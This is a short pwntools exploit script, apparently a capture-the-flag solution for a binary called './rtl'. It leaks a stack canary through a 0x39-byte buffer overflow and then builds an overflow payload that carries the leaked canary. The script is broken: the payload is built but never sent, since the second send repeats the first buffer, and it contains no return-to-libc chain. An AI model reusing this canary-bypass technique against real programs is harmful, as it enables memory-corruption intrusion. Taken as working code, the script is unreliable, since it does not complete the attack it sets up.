from pwn import *
import warnings

warnings.filterwarnings( 'ignore' )

p = process('./rtl')

buf = b"A"*0x39
p.sendlineafter("Buf: ", buf)
cnry = u64(b'\x00' + p.recv(7))
print(hex(cnry))

payload = b"A"*0x38 + p64(cnry) + b"A"*8
p.sendlineafter("Buf: ", buf)

p.interactive()
